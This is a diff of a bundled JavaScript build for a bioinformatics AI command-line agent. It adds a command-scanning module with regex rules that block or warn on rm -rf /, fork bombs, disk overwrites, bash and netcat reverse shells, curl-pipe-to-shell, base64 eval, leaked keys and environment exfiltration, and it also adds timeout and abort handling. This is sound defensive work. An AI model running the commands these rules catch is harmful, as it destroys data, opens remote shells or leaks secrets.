@@ -2092,7 +2092,7 @@ var require_lib2 = __commonJS({
       let accum = [];
       let accumBytes = 0;
       let abort = false;
-      return new Body.Promise(function(resolve3, reject) {
+      return new Body.Promise(function(resolve4, reject) {
         let resTimeout;
         if (_this4.timeout) {
           resTimeout = setTimeout(function() {
@@ -2126,7 +2126,7 @@ var require_lib2 = __commonJS({
           }
           clearTimeout(resTimeout);
           try {
-            resolve3(Buffer.concat(accum, accumBytes));
+            resolve4(Buffer.concat(accum, accumBytes));
           } catch (err) {
             reject(new FetchError(`Could not create Buffer from response body for ${_this4.url}: ${err.message}`, "system", err));
           }
@@ -2801,7 +2801,7 @@ var require_lib2 = __commonJS({
         throw new Error("native promise missing, set fetch.Promise to your favorite alternative");
       }
       Body.Promise = fetch2.Promise;
-      return new fetch2.Promise(function(resolve3, reject) {
+      return new fetch2.Promise(function(resolve4, reject) {
         const request = new Request3(url, opts);
         const options = getNodeRequestOptions(request);
         const send = (options.protocol === "https:" ? https : http).request;
@@ -2934,7 +2934,7 @@ var require_lib2 = __commonJS({
                   requestOpts.body = void 0;
                   requestOpts.headers.delete("content-length");
                 }
-                resolve3(fetch2(new Request3(locationURL, requestOpts)));
+                resolve4(fetch2(new Request3(locationURL, requestOpts)));
                 finalize();
                 return;
             }
@@ -2955,7 +2955,7 @@ var require_lib2 = __commonJS({
           const codings = headers.get("Content-Encoding");
           if (!request.compress || request.method === "HEAD" || codings === null || res.statusCode === 204 || res.statusCode === 304) {
             response = new Response3(body, response_options);
-            resolve3(response);
+            resolve4(response);
             return;
           }
           const zlibOptions = {
@@ -2965,7 +2965,7 @@ var require_lib2 = __commonJS({
           if (codings == "gzip" || codings == "x-gzip") {
             body = body.pipe(zlib.createGunzip(zlibOptions));
             response = new Response3(body, response_options);
-            resolve3(response);
+            resolve4(response);
             return;
           }
           if (codings == "deflate" || codings == "x-deflate") {
@@ -2977,12 +2977,12 @@ var require_lib2 = __commonJS({
                 body = body.pipe(zlib.createInflateRaw());
               }
               response = new Response3(body, response_options);
-              resolve3(response);
+              resolve4(response);
             });
             raw.on("end", function() {
               if (!response) {
                 response = new Response3(body, response_options);
-                resolve3(response);
+                resolve4(response);
               }
             });
             return;
@@ -2990,11 +2990,11 @@ var require_lib2 = __commonJS({
           if (codings == "br" && typeof zlib.createBrotliDecompress === "function") {
             body = body.pipe(zlib.createBrotliDecompress());
             response = new Response3(body, response_options);
-            resolve3(response);
+            resolve4(response);
             return;
           }
           response = new Response3(body, response_options);
-          resolve3(response);
+          resolve4(response);
         });
         writeToStream(req, request);
       });
@@ -6932,9 +6932,9 @@ var chalkStderr = createChalk({ level: stderrColor ? stderrColor.level : 0 });
 var source_default = chalk;
 
 // src/index.ts
-var import_fs5 = require("fs");
-var import_path5 = require("path");
-var import_os3 = require("os");
+var import_fs6 = require("fs");
+var import_path6 = require("path");
+var import_os4 = require("os");
 var import_https2 = require("https");
 var import_child_process2 = require("child_process");
 
@@ -8372,8 +8372,8 @@ function _addRequestID(value, response) {
 }
 var APIPromise = class _APIPromise extends Promise {
   constructor(responsePromise, parseResponse2 = defaultParseResponse) {
-    super((resolve3) => {
-      resolve3(null);
+    super((resolve4) => {
+      resolve4(null);
     });
     this.responsePromise = responsePromise;
     this.parseResponse = parseResponse2;
@@ -8948,7 +8948,7 @@ var startsWithSchemeRegexp = /^[a-z][a-z0-9+.-]*:/i;
 var isAbsoluteURL = (url) => {
   return startsWithSchemeRegexp.test(url);
 };
-var sleep = (ms) => new Promise((resolve3) => setTimeout(resolve3, ms));
+var sleep = (ms) => new Promise((resolve4) => setTimeout(resolve4, ms));
 var validatePositiveInteger = (name, n2) => {
   if (typeof n2 !== "number" || !Number.isInteger(n2)) {
     throw new OpenAIError(`${name} must be an integer`);
@@ -9381,12 +9381,12 @@ var EventStream = class {
     _EventStream_errored.set(this, false);
     _EventStream_aborted.set(this, false);
     _EventStream_catchingPromiseCreated.set(this, false);
-    __classPrivateFieldSet7(this, _EventStream_connectedPromise, new Promise((resolve3, reject) => {
-      __classPrivateFieldSet7(this, _EventStream_resolveConnectedPromise, resolve3, "f");
+    __classPrivateFieldSet7(this, _EventStream_connectedPromise, new Promise((resolve4, reject) => {
+      __classPrivateFieldSet7(this, _EventStream_resolveConnectedPromise, resolve4, "f");
       __classPrivateFieldSet7(this, _EventStream_rejectConnectedPromise, reject, "f");
     }), "f");
-    __classPrivateFieldSet7(this, _EventStream_endPromise, new Promise((resolve3, reject) => {
-      __classPrivateFieldSet7(this, _EventStream_resolveEndPromise, resolve3, "f");
+    __classPrivateFieldSet7(this, _EventStream_endPromise, new Promise((resolve4, reject) => {
+      __classPrivateFieldSet7(this, _EventStream_resolveEndPromise, resolve4, "f");
       __classPrivateFieldSet7(this, _EventStream_rejectEndPromise, reject, "f");
     }), "f");
     __classPrivateFieldGet8(this, _EventStream_connectedPromise, "f").catch(() => {
@@ -9470,11 +9470,11 @@ var EventStream = class {
    *   const message = await stream.emitted('message') // rejects if the stream errors
    */
   emitted(event) {
-    return new Promise((resolve3, reject) => {
+    return new Promise((resolve4, reject) => {
       __classPrivateFieldSet7(this, _EventStream_catchingPromiseCreated, true, "f");
       if (event !== "error")
         this.once("error", reject);
-      this.once(event, resolve3);
+      this.once(event, resolve4);
     });
   }
   async done() {
@@ -9627,7 +9627,7 @@ var AssistantStream = class _AssistantStream extends EventStream {
           if (done) {
             return { value: void 0, done: true };
           }
-          return new Promise((resolve3, reject) => readQueue.push({ resolve: resolve3, reject })).then((chunk2) => chunk2 ? { value: chunk2, done: false } : { value: void 0, done: true });
+          return new Promise((resolve4, reject) => readQueue.push({ resolve: resolve4, reject })).then((chunk2) => chunk2 ? { value: chunk2, done: false } : { value: void 0, done: true });
         }
         const chunk = pushQueue.shift();
         return { value: chunk, done: false };
@@ -11245,7 +11245,7 @@ var ChatCompletionStream = class _ChatCompletionStream extends AbstractChatCompl
           if (done) {
             return { value: void 0, done: true };
           }
-          return new Promise((resolve3, reject) => readQueue.push({ resolve: resolve3, reject })).then((chunk2) => chunk2 ? { value: chunk2, done: false } : { value: void 0, done: true });
+          return new Promise((resolve4, reject) => readQueue.push({ resolve: resolve4, reject })).then((chunk2) => chunk2 ? { value: chunk2, done: false } : { value: void 0, done: true });
         }
         const chunk = pushQueue.shift();
         return { value: chunk, done: false };
@@ -12896,7 +12896,7 @@ var ResponseStream = class _ResponseStream extends EventStream {
           if (done) {
             return { value: void 0, done: true };
           }
-          return new Promise((resolve3, reject) => readQueue.push({ resolve: resolve3, reject })).then((event2) => event2 ? { value: event2, done: false } : { value: void 0, done: true });
+          return new Promise((resolve4, reject) => readQueue.push({ resolve: resolve4, reject })).then((event2) => event2 ? { value: event2, done: false } : { value: void 0, done: true });
         }
         const event = pushQueue.shift();
         return { value: event, done: false };
@@ -13605,9 +13605,12 @@ var BGI_DIR = (0, import_path2.join)((0, import_os.homedir)(), ".bgicli");
 var WORKFLOWS_DIR = (0, import_path2.join)(BGI_DIR, "workflows");
 var TOOLS_DIR = (0, import_path2.join)(BGI_DIR, "tools");
 var SKILLS_DIR = (0, import_path2.join)(BGI_DIR, "skills");
+var USER_SKILLS_DIR = (0, import_path2.join)(BGI_DIR, "user-skills");
+var DATABASES_FILE = (0, import_path2.join)(BGI_DIR, "databases.json");
+var DATA_VERSION_FILE = (0, import_path2.join)(BGI_DIR, ".data-version");
 var CONFIG_FILE = (0, import_path2.join)(BGI_DIR, "config.json");
 function ensureDirs() {
-  for (const dir of [BGI_DIR, WORKFLOWS_DIR, TOOLS_DIR, SKILLS_DIR]) {
+  for (const dir of [BGI_DIR, WORKFLOWS_DIR, TOOLS_DIR, SKILLS_DIR, USER_SKILLS_DIR]) {
     if (!(0, import_fs2.existsSync)(dir)) (0, import_fs2.mkdirSync)(dir, { recursive: true });
   }
 }
@@ -13636,6 +13639,205 @@ var import_path3 = require("path");
 var import_os2 = require("os");
 var import_https = require("https");
 var import_http = require("http");
+
+// src/security.ts
+var PATTERNS = [
+  // ── CRITICAL: always block ─────────────────────────────────────────────────
+  {
+    id: "rm-root",
+    pattern: /\brm\s+(-[rRf]{1,3}\s+)+\/\s*$/,
+    level: "CRITICAL",
+    reason: "\u5220\u9664\u6839\u76EE\u5F55 (rm -rf /)"
+  },
+  {
+    id: "rm-root-star",
+    pattern: /\brm\s+(-[rRf]{1,3}\s+)+\/\*/,
+    level: "CRITICAL",
+    reason: "\u5220\u9664\u6839\u76EE\u5F55\u6240\u6709\u5185\u5BB9 (rm -rf /*)"
+  },
+  {
+    id: "rm-home",
+    pattern: /\brm\s+(-[rRf]{1,3}\s+)+(~|\$HOME)\s*$/,
+    level: "CRITICAL",
+    reason: "\u5220\u9664 home \u76EE\u5F55 (rm -rf ~/)"
+  },
+  {
+    id: "fork-bomb",
+    pattern: /:\(\)\s*\{[^}]*:\s*\|\s*:&[^}]*\}/,
+    level: "CRITICAL",
+    reason: "Fork bomb \u2014 \u8017\u5C3D\u7CFB\u7EDF\u8FDB\u7A0B"
+  },
+  {
+    id: "dd-disk",
+    pattern: /\bdd\s+.*if=\/dev\/(zero|random|urandom)\s+.*of=\/dev\/[a-z]/,
+    level: "CRITICAL",
+    reason: "\u8986\u5199\u78C1\u76D8\u8BBE\u5907 (dd if=/dev/zero of=/dev/sd*)"
+  },
+  {
+    id: "mkfs",
+    pattern: /\bmkfs(\.[a-z0-9]+)?\s+\/dev\//,
+    level: "CRITICAL",
+    reason: "\u683C\u5F0F\u5316\u78C1\u76D8\u5206\u533A (mkfs)"
+  },
+  {
+    id: "write-disk-raw",
+    pattern: />\s*\/dev\/sd[a-z][0-9]?(?!\w)/,
+    level: "CRITICAL",
+    reason: "\u76F4\u63A5\u5199\u5165\u88F8\u78C1\u76D8\u8BBE\u5907"
+  },
+  {
+    id: "reverse-shell-bash",
+    pattern: /bash\s+-i\s*>&?\s*\/dev\/tcp\//,
+    level: "CRITICAL",
+    reason: "bash \u53CD\u5F39 shell (bash -i >& /dev/tcp/)"
+  },
+  {
+    id: "reverse-shell-nc",
+    pattern: /\bnc\s+.*-e\s+\/bin\/(ba)?sh/,
+    level: "CRITICAL",
+    reason: "netcat \u53CD\u5F39 shell (nc -e /bin/sh)"
+  },
+  // ── HIGH: warn user ────────────────────────────────────────────────────────
+  {
+    id: "curl-pipe-exec",
+    pattern: /curl\s+[^|]*\|\s*(ba)?sh/,
+    level: "HIGH",
+    reason: "curl \u7BA1\u9053\u6267\u884C \u2014 \u8FDC\u7A0B\u4EE3\u7801\u6CE8\u5165\u98CE\u9669"
+  },
+  {
+    id: "wget-pipe-exec",
+    pattern: /wget\s+[^|]*\|\s*(ba)?sh/,
+    level: "HIGH",
+    reason: "wget \u7BA1\u9053\u6267\u884C \u2014 \u8FDC\u7A0B\u4EE3\u7801\u6CE8\u5165\u98CE\u9669"
+  },
+  {
+    id: "eval-base64",
+    pattern: /\beval\s*[\(\$`].*base64/i,
+    level: "HIGH",
+    reason: "eval(base64) \u2014 \u9690\u85CF\u4EE3\u7801\u6267\u884C"
+  },
+  {
+    id: "python-exec-base64",
+    pattern: /python[23]?\s+-c\s+["'].*exec\s*\(.*base64/i,
+    level: "HIGH",
+    reason: "Python exec(base64) \u2014 \u9690\u85CF\u4EE3\u7801\u6267\u884C"
+  },
+  {
+    id: "cred-aws",
+    pattern: /\bAKID[A-Z0-9]{16,}\b|\bAKIA[0-9A-Z]{16}\b/,
+    level: "HIGH",
+    reason: "AWS/\u817E\u8BAF\u4E91 Access Key \u7591\u4F3C\u6CC4\u9732"
+  },
+  {
+    id: "cred-private-key",
+    pattern: /-----BEGIN\s+(RSA|EC|OPENSSH|DSA|ENCRYPTED)\s+PRIVATE KEY-----/,
+    level: "HIGH",
+    reason: "\u79C1\u94A5\u5185\u5BB9\u6CC4\u9732"
+  },
+  {
+    id: "cred-gh-token",
+    pattern: /\bghp_[A-Za-z0-9]{36}\b|\bgho_[A-Za-z0-9]{36}\b/,
+    level: "HIGH",
+    reason: "GitHub Personal Access Token \u6CC4\u9732"
+  },
+  {
+    id: "env-exfil",
+    pattern: /\benv\b[^|]*\|\s*(curl|wget|nc)\b/,
+    level: "HIGH",
+    reason: "\u73AF\u5883\u53D8\u91CF\u901A\u8FC7\u7F51\u7EDC\u6CC4\u9732"
+  },
+  {
+    id: "reverse-shell-python",
+    pattern: /python[23]?\s+-c\s+["'].*socket.*connect.*subprocess/s,
+    level: "HIGH",
+    reason: "Python \u53CD\u5F39 shell"
+  },
+  // ── MEDIUM: warn, allow ────────────────────────────────────────────────────
+  {
+    id: "chmod-777-r",
+    pattern: /\bchmod\s+(-R\s+)?777\s+\//,
+    level: "MEDIUM",
+    reason: "\u9012\u5F52\u8BBE\u7F6E 777 \u6743\u9650\uFF08\u53EF\u80FD\u66B4\u9732\u7CFB\u7EDF\u6587\u4EF6\uFF09"
+  },
+  {
+    id: "setuid-bit",
+    pattern: /\bchmod\s+[uo]\+s\b/,
+    level: "MEDIUM",
+    reason: "\u8BBE\u7F6E setuid/setgid \u4F4D"
+  },
+  {
+    id: "cron-modify",
+    pattern: /\bcrontab\s+-[il]/,
+    level: "MEDIUM",
+    reason: "\u4FEE\u6539 cron \u5B9A\u65F6\u4EFB\u52A1"
+  },
+  {
+    id: "history-clear",
+    pattern: /history\s+-[cw]|>\s*~\/\.bash_history/,
+    level: "MEDIUM",
+    reason: "\u6E05\u9664 shell \u5386\u53F2\u8BB0\u5F55"
+  },
+  {
+    id: "iptables-flush",
+    pattern: /\biptables\s+-F\b/,
+    level: "MEDIUM",
+    reason: "\u6E05\u7A7A\u9632\u706B\u5899\u89C4\u5219 (iptables -F)"
+  },
+  // ── LOW: info only ─────────────────────────────────────────────────────────
+  {
+    id: "curl-insecure",
+    pattern: /\bcurl\s+.*(-k|--insecure)\b/,
+    level: "LOW",
+    reason: "curl \u8DF3\u8FC7 TLS \u8BC1\u4E66\u9A8C\u8BC1"
+  },
+  {
+    id: "wget-no-cert",
+    pattern: /\bwget\s+.*--no-check-certificate\b/,
+    level: "LOW",
+    reason: "wget \u8DF3\u8FC7 TLS \u8BC1\u4E66\u9A8C\u8BC1"
+  },
+  {
+    id: "sudo-usage",
+    pattern: /\bsudo\b/,
+    level: "LOW",
+    reason: "\u4F7F\u7528 sudo \u63D0\u6743"
+  },
+  {
+    id: "nohup-background",
+    pattern: /\bnohup\b.*&\s*$|\bdisown\b/,
+    level: "LOW",
+    reason: "\u540E\u53F0\u9A7B\u7559\u8FDB\u7A0B"
+  }
+];
+function scanCommand(command) {
+  const matches = [];
+  for (const pat of PATTERNS) {
+    const m2 = command.match(pat.pattern);
+    if (m2) {
+      matches.push({ pattern: pat, matchedText: m2[0] });
+    }
+  }
+  const safe = matches.every((m2) => m2.pattern.level !== "CRITICAL");
+  return { safe, matches };
+}
+function scanSkillMd(markdownContent) {
+  const bashBlocks = [...markdownContent.matchAll(/```(?:bash|sh)\n([\s\S]*?)```/g)].map((m2) => m2[1]);
+  const allMatches = [];
+  for (const block of bashBlocks) {
+    for (const line of block.split("\n")) {
+      const r2 = scanCommand(line.trim());
+      allMatches.push(...r2.matches);
+    }
+  }
+  return {
+    criticalCount: allMatches.filter((m2) => m2.pattern.level === "CRITICAL").length,
+    highCount: allMatches.filter((m2) => m2.pattern.level === "HIGH").length,
+    mediumCount: allMatches.filter((m2) => m2.pattern.level === "MEDIUM").length,
+    matches: allMatches
+  };
+}
+
+// src/tools.ts
 var TOOL_DEFINITIONS = [
   {
     type: "function",
@@ -13655,7 +13857,7 @@ var TOOL_DEFINITIONS = [
           },
           timeout_ms: {
             type: "number",
-            description: "Timeout in milliseconds (default 300000 / 5 min, max 1800000 / 30 min for long jobs like STAR alignment)"
+            description: "Timeout in milliseconds (default 300000 / 5 min). For downloads (wget/curl/aria2c) or long computations (STAR, HISAT2, etc.) ALWAYS use at least 3600000 (60 min). Never set a short timeout for downloads \u2014 slow networks are normal, be patient."
           }
         },
         required: ["command"]
@@ -13756,16 +13958,18 @@ var TOOL_DEFINITIONS = [
     }
   }
 ];
-async function executeTool(name, args, onStream) {
+async function executeTool(name, args, onStream, signal) {
   try {
     switch (name) {
-      case "bash":
-        return await toolBash(
-          args["command"],
-          args["workdir"],
-          args["timeout_ms"] ?? 3e5,
-          onStream
-        );
+      case "bash": {
+        const cmd = args["command"];
+        const requestedTimeout = args["timeout_ms"] ?? 3e5;
+        const isDownload = /\b(wget|curl|aria2c|axel|rsync)\b/.test(cmd);
+        if (isDownload) {
+          return await toolBash(cmd, args["workdir"], 0, onStream, 6e5, signal);
+        }
+        return await toolBash(cmd, args["workdir"], requestedTimeout, onStream, void 0, signal);
+      }
       case "read_file":
         return toolReadFile(
           args["path"],
@@ -13806,37 +14010,45 @@ function decodeBuffer(buf) {
     }
   }
 }
-var DANGEROUS_PATTERNS = [
-  { pattern: /rm\s+-rf\s+\/(?!\S)/, reason: "\u5220\u9664\u6839\u76EE\u5F55 (rm -rf /)" },
-  { pattern: /rm\s+-rf\s+~(?!\S)/, reason: "\u5220\u9664 home \u76EE\u5F55 (rm -rf ~)" },
-  { pattern: /rm\s+-rf\s+\$HOME(?!\S)/, reason: "\u5220\u9664 $HOME \u76EE\u5F55" },
-  { pattern: /dd\s+if=\/dev\/(?:zero|random|urandom)\s+of=\/dev\//, reason: "\u8986\u5199\u78C1\u76D8\u8BBE\u5907 (dd)" },
-  { pattern: /mkfs\b/, reason: "\u683C\u5F0F\u5316\u6587\u4EF6\u7CFB\u7EDF (mkfs)" },
-  { pattern: />\s*\/dev\/sd[a-z]/, reason: "\u76F4\u63A5\u5199\u5165\u78C1\u76D8\u8BBE\u5907" },
-  { pattern: /chmod\s+-R\s+777\s+\/(?!\S)/, reason: "\u9012\u5F52\u4FEE\u6539\u6839\u76EE\u5F55\u6743\u9650" },
-  { pattern: /:\(\)\s*\{.*\}.*:/, reason: "Fork bomb \u68C0\u6D4B" }
-];
-function checkDangerousCommand(command) {
-  for (const { pattern, reason } of DANGEROUS_PATTERNS) {
-    if (pattern.test(command)) return reason;
+function injectProgressFlags(cmd) {
+  if (/\bwget\b/.test(cmd) && !/-q\b|--quiet|--show-progress|--progress/.test(cmd)) {
+    cmd = cmd.replace(/\bwget\b/, "wget --show-progress");
   }
-  return null;
+  if (/\bcurl\b/.test(cmd) && !/-s\b|--silent|-S\b|-#|--progress-bar|--no-progress-meter/.test(cmd)) {
+    cmd = cmd.replace(/\bcurl\b/, "curl --progress-bar");
+  }
+  return cmd;
 }
-async function toolBash(command, workdir, timeoutMs = 3e5, onStream) {
-  const danger = checkDangerousCommand(command);
-  if (danger) {
+async function toolBash(command, workdir, timeoutMs = 3e5, onStream, inactivityMs, signal) {
+  const scan = scanCommand(command);
+  const criticals = scan.matches.filter((m2) => m2.pattern.level === "CRITICAL");
+  if (criticals.length > 0) {
+    const reasons = criticals.map((m2) => m2.pattern.reason).join("\u3001");
     return {
       output: "",
-      error: `\u26A0\uFE0F  \u5B89\u5168\u62E6\u622A\uFF1A\u68C0\u6D4B\u5230\u5371\u9669\u547D\u4EE4\uFF08${danger}\uFF09\u3002
-\u547D\u4EE4\u5DF2\u88AB\u963B\u6B62\uFF0C\u8BF7\u786E\u8BA4\u4F60\u7684\u610F\u56FE\u540E\u624B\u52A8\u6267\u884C\u3002
-\u88AB\u62E6\u622A\u7684\u547D\u4EE4: ${command}`
+      error: `\u5B89\u5168\u62E6\u622A [CRITICAL]: ${reasons}
+\u547D\u4EE4\u5DF2\u88AB\u963B\u6B62: ${command}`
     };
   }
-  return new Promise((resolve3) => {
+  const highs = scan.matches.filter((m2) => m2.pattern.level === "HIGH");
+  if (highs.length > 0) {
+    const reasons = highs.map((m2) => m2.pattern.reason).join("\u3001");
+    if (onStream) onStream(`\u26A0 \u5B89\u5168\u8B66\u544A [HIGH]: ${reasons}
+`);
+  }
+  const processedCommand = injectProgressFlags(command);
+  return new Promise((resolve4) => {
     const isWin = process.platform === "win32";
-    const child = (0, import_child_process.spawn)(isWin ? "cmd" : "/bin/sh", isWin ? ["/c", command] : ["-c", command], {
+    const child = (0, import_child_process.spawn)(isWin ? "cmd" : "/bin/sh", isWin ? ["/c", processedCommand] : ["-c", processedCommand], {
       cwd: workdir ?? process.cwd(),
-      env: { ...process.env, PYTHONIOENCODING: "utf-8" },
+      env: {
+        ...process.env,
+        PYTHONIOENCODING: "utf-8",
+        PYTHONUNBUFFERED: "1",
+        // prevent Python stdout buffering
+        FORCE_COLOR: "1"
+        // hint color support to tools that check
+      },
       stdio: ["pipe", "pipe", "pipe"]
     });
     const outChunks = [];
@@ -13856,24 +14068,53 @@ async function toolBash(command, workdir, timeoutMs = 3e5, onStream) {
       }
     });
     let timedOut = false;
-    const timer = setTimeout(() => {
+    let timedOutSecs = 0;
+    let aborted = false;
+    if (signal) {
+      if (signal.aborted) {
+        child.kill();
+        return resolve4({ output: "", error: "\u4EFB\u52A1\u5DF2\u4E2D\u65AD" });
+      }
+      signal.addEventListener("abort", () => {
+        aborted = true;
+        child.kill();
+      }, { once: true });
+    }
+    const effectiveMs = inactivityMs ?? timeoutMs;
+    let timer = setTimeout(() => {
       timedOut = true;
+      timedOutSecs = effectiveMs / 1e3;
       child.kill();
-    }, timeoutMs);
+    }, effectiveMs);
+    const resetTimer = inactivityMs ? () => {
+      clearTimeout(timer);
+      timer = setTimeout(() => {
+        timedOut = true;
+        timedOutSecs = inactivityMs / 1e3;
+        child.kill();
+      }, inactivityMs);
+    } : null;
+    if (resetTimer) {
+      child.stdout?.on("data", resetTimer);
+      child.stderr?.on("data", resetTimer);
+    }
     child.on("close", (code) => {
       clearTimeout(timer);
       const out = (decodeBuffer(Buffer.concat(outChunks)) + "\n" + decodeBuffer(Buffer.concat(errChunks))).trim();
-      if (timedOut) {
-        resolve3({ output: out, error: `Command timed out after ${timeoutMs / 1e3}s` });
+      if (aborted) {
+        resolve4({ output: out, error: "\u4EFB\u52A1\u5DF2\u4E2D\u65AD" });
+      } else if (timedOut) {
+        const msg = inactivityMs ? `\u4E0B\u8F7D\u505C\u6EDE \u2014 \u8D85\u8FC7 ${timedOutSecs}s \u65E0\u4EFB\u4F55\u8F93\u51FA\uFF08\u8FDE\u63A5\u53EF\u80FD\u5DF2\u65AD\u5F00\uFF09` : `Command timed out after ${timedOutSecs}s`;
+        resolve4({ output: out, error: msg });
       } else if (code !== 0) {
-        resolve3({ output: out, error: `Command failed (exit ${code})` });
+        resolve4({ output: out, error: `Command failed (exit ${code})` });
       } else {
-        resolve3({ output: out });
+        resolve4({ output: out });
       }
     });
     child.on("error", (err) => {
       clearTimeout(timer);
-      resolve3({ output: "", error: err.message });
+      resolve4({ output: "", error: err.message });
     });
   });
 }
@@ -13911,11 +14152,11 @@ async function toolSearchFiles(pattern, rootPath) {
   return toolBash(command, resolved, 1e4);
 }
 function httpFetch(url, timeoutMs = 15e3) {
-  return new Promise((resolve3, reject) => {
+  return new Promise((resolve4, reject) => {
     const getter = url.startsWith("https") ? import_https.get : import_http.get;
     const req = getter(url, { headers: { "User-Agent": "BGI-CLI/1.0" } }, (res) => {
       if ((res.statusCode === 301 || res.statusCode === 302) && res.headers.location) {
-        httpFetch(res.headers.location, timeoutMs).then(resolve3).catch(reject);
+        httpFetch(res.headers.location, timeoutMs).then(resolve4).catch(reject);
         return;
       }
       if (res.statusCode && res.statusCode >= 400) {
@@ -13924,7 +14165,7 @@ function httpFetch(url, timeoutMs = 15e3) {
       }
       const chunks = [];
       res.on("data", (c2) => chunks.push(c2));
-      res.on("end", () => resolve3(Buffer.concat(chunks).toString("utf8")));
+      res.on("end", () => resolve4(Buffer.concat(chunks).toString("utf8")));
       res.on("error", reject);
     });
     req.setTimeout(timeoutMs, () => {
@@ -14027,7 +14268,7 @@ ${shortSummary}`);
 }
 
 // src/chat.ts
-async function chat(messages, config, systemPrompt) {
+async function chat(messages, config, systemPrompt2, stats, signal) {
   const prov = PROVIDERS[config.provider];
   if (!prov) throw new Error(`Unknown provider: ${config.provider}`);
   if (config.provider === "custom") {
@@ -14041,16 +14282,31 @@ async function chat(messages, config, systemPrompt) {
   if (requiresKey && !apiKey) throw new Error(`\u672A\u914D\u7F6E API Key (${config.provider})\u3002\u8FD0\u884C: /connect`);
   const client = new openai_default({ apiKey: apiKey || "none", baseURL });
   const fullMessages = [
-    { role: "system", content: systemPrompt },
+    { role: "system", content: systemPrompt2 },
     ...messages
   ];
-  return await streamLoop(client, fullMessages, config.model);
+  return await streamLoop(client, fullMessages, config.model, stats, signal);
 }
-async function streamLoop(client, messages, model) {
+async function streamLoop(client, messages, model, stats, signal) {
   let finalText = "";
   for (let round = 0; round < 20; round++) {
+    if (signal?.aborted) break;
     messages = deduplicateSkillInjections(trimToolOutputs(messages));
-    const { text, toolCalls, finishReason } = await streamOnce(client, messages, model);
+    let streamResult;
+    try {
+      streamResult = await streamOnce(client, messages, model, signal);
+    } catch (err) {
+      if (signal?.aborted || err instanceof Error && (err.name === "AbortError" || err.message.includes("abort"))) {
+        process.stdout.write(source_default.yellow("\n  [\u4EFB\u52A1\u5DF2\u4E2D\u65AD]\n"));
+        break;
+      }
+      throw err;
+    }
+    const { text, toolCalls, finishReason, inputTokens, outputTokens } = streamResult;
+    if (stats) {
+      stats.inputTokens += inputTokens;
+      stats.outputTokens += outputTokens;
+    }
     if (text) finalText = text;
     if (finishReason === "tool_calls" && toolCalls.length > 0) {
       messages.push({
@@ -14070,47 +14326,98 @@ async function streamLoop(client, messages, model) {
         const label = source_default.dim(`[\u5DE5\u5177: ${tc.name}(${summarizeArgs(args)})]`);
         const t0 = Date.now();
         process.stdout.write(`
-${label}
-`);
+${label} `);
         let streamedLines = 0;
         let lastLineWasEmpty = false;
+        let spinnerCleared = false;
+        let partialLine = "";
+        let outputStarted = false;
         const MAX_STREAM_LINES = 200;
-        let spin = null;
         let frame = 0;
+        const spin = setInterval(() => {
+          if (spinnerCleared) return;
+          const secs = ((Date.now() - t0) / 1e3).toFixed(1);
+          process.stdout.write(
+            `\r${label} ${source_default.cyan(SPIN_FRAMES[frame++ % SPIN_FRAMES.length])} ${source_default.dim(secs + "s")}`
+          );
+        }, 80);
+        const clearSpinner = () => {
+          if (spinnerCleared) return;
+          spinnerCleared = true;
+          clearInterval(spin);
+          process.stdout.write("\r\x1B[2K");
+        };
+        let lastChunkTime = t0;
+        let heartbeat = null;
+        const clearHeartbeat = () => {
+          if (heartbeat) {
+            clearInterval(heartbeat);
+            heartbeat = null;
+          }
+        };
+        signal?.addEventListener("abort", clearHeartbeat, { once: true });
         const onStream = isBash ? (chunk) => {
-          if (streamedLines >= MAX_STREAM_LINES) return;
-          const lines = chunk.split("\n");
-          for (let i2 = 0; i2 < lines.length; i2++) {
-            const line = lines[i2];
-            if (line.trim() === "") {
-              if (lastLineWasEmpty) continue;
-              lastLineWasEmpty = true;
-            } else {
-              lastLineWasEmpty = false;
-            }
-            if (i2 < lines.length - 1 || line.length > 0) {
-              process.stdout.write(source_default.dim("  \u2502 ") + line + (i2 < lines.length - 1 ? "\n" : ""));
-              streamedLines++;
-              if (streamedLines >= MAX_STREAM_LINES) {
-                process.stdout.write(source_default.dim("\n  \u2502 ... (\u8F93\u51FA\u8FC7\u957F\uFF0C\u5DF2\u622A\u65AD)\n"));
-                break;
+          lastChunkTime = Date.now();
+          if (!outputStarted) {
+            outputStarted = true;
+            clearSpinner();
+            process.stdout.write(`${label}
+`);
+            heartbeat = setInterval(() => {
+              if (Date.now() - lastChunkTime >= 5e3) {
+                const totalSecs = ((Date.now() - t0) / 1e3).toFixed(0);
+                process.stdout.write(source_default.dim(`
+  \u2502 \u23F1 \u8FD0\u884C\u4E2D... ${totalSecs}s`));
               }
+            }, 5e3);
+          }
+          let i2 = 0;
+          while (i2 < chunk.length) {
+            const crPos = chunk.indexOf("\r", i2);
+            const nlPos = chunk.indexOf("\n", i2);
+            if (crPos === -1 && nlPos === -1) {
+              partialLine += chunk.slice(i2);
+              process.stdout.write("\r" + source_default.dim("  \u2502 ") + partialLine + "\x1B[K");
+              break;
+            }
+            const nextPos = crPos === -1 ? nlPos : nlPos === -1 ? crPos : Math.min(crPos, nlPos);
+            const isCR = chunk[nextPos] === "\r";
+            partialLine += chunk.slice(i2, nextPos);
+            if (isCR) {
+              process.stdout.write("\r" + source_default.dim("  \u2502 ") + partialLine + "\x1B[K");
+              partialLine = "";
+              i2 = nextPos + 1;
+              if (i2 < chunk.length && chunk[i2] === "\n") i2++;
+            } else {
+              if (partialLine.trim() !== "" || !lastLineWasEmpty) {
+                if (streamedLines < MAX_STREAM_LINES) {
+                  process.stdout.write("\r" + source_default.dim("  \u2502 ") + partialLine + "\x1B[K\n");
+                  lastLineWasEmpty = partialLine.trim() === "";
+                  streamedLines++;
+                  if (streamedLines >= MAX_STREAM_LINES) {
+                    process.stdout.write(source_default.dim("  \u2502 ... (\u8F93\u51FA\u8FC7\u957F\uFF0C\u5DF2\u622A\u65AD)\n"));
+                  }
+                }
+              }
+              partialLine = "";
+              i2 = nextPos + 1;
             }
           }
         } : void 0;
-        if (!isBash) {
-          spin = setInterval(() => {
-            const secs = ((Date.now() - t0) / 1e3).toFixed(1);
-            process.stdout.write(
-              `\r  ${source_default.cyan(SPIN_FRAMES[frame++ % SPIN_FRAMES.length])} ${source_default.dim(secs + "s")}`
-            );
-          }, 80);
+        const result = await executeTool(tc.name, args, onStream, signal);
+        signal?.removeEventListener("abort", clearHeartbeat);
+        clearHeartbeat();
+        if (partialLine) {
+          if (streamedLines < MAX_STREAM_LINES) {
+            process.stdout.write("\r" + source_default.dim("  \u2502 ") + partialLine + "\x1B[K\n");
+          }
+          partialLine = "";
         }
-        const result = await executeTool(tc.name, args, onStream);
-        if (spin) {
-          clearInterval(spin);
